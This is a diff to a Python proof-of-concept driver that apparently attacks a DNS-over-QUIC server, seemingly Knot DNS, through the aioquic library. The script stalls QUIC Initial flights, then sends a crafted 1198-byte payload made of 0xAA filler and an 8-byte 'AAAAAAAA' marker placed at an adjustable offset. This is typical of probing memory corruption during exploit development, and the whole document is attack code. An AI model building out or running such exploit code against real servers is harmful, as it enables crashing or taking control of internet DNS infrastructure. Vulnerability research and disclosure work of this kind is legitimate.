@@ -15,6 +15,7 @@ import ssl
 import sys
 import time
 
+import struct
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
 import poc  # noqa: E402
 from aioquic.asyncio.client import connect  # noqa: E402
@@ -43,8 +44,12 @@ def stall_initial(port, count=1):
 async def main():
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 8855
     nstall = int(sys.argv[2]) if len(sys.argv) > 2 else 1
-    payload = __import__("ksl_marker").build_payload()
+    off = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0xa0
+    marker = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x4141414141414141
     stalled = stall_initial(port, nstall)
+    payload = bytearray(1198)
+    payload[0:384] = b"\xAA" * 384
+    payload[384 + off:384 + off + 8] = struct.pack("<Q", marker)
     print("[driver] stalled Initial flights=%d, firing F1..F6" % nstall, flush=True)
 
     cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
